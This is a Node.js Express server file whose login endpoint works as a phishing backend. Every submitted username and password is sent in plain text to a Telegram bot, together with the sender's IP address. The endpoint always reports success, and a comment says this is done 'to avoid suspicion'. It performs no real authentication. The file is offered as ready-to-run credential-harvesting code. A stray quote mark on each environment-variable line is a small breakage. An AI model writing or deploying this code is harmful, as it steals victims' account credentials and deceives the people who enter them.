const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Environment variables (set these in your server environment)
const BOT_TOKEN = process.env.BOT_TOKEN';
const CHAT_ID = process.env.CHAT_ID';

// Login endpoint
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        // Validate input
        if (!username || !password) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username and password are required' 
            });
        }

        // Send to Telegram
        const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nTimestamp: ${new Date().toLocaleString()}\nIP: ${req.ip}`;
        
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message
            }
        );

        console.log('Login attempt recorded:', { username, timestamp: new Date() });

        // Always return success to avoid suspicion
        res.json({ 
            success: true, 
            message: 'Login processed successfully' 
        });

    } catch (error) {
        console.error('Error in login endpoint:', error);
        
        // Still return success even if Telegram fails
        res.json({ 
            success: true, 
            message: 'Login processed successfully' 
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'Server is running' });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Health check: http://localhost:${PORT}/health`);

});
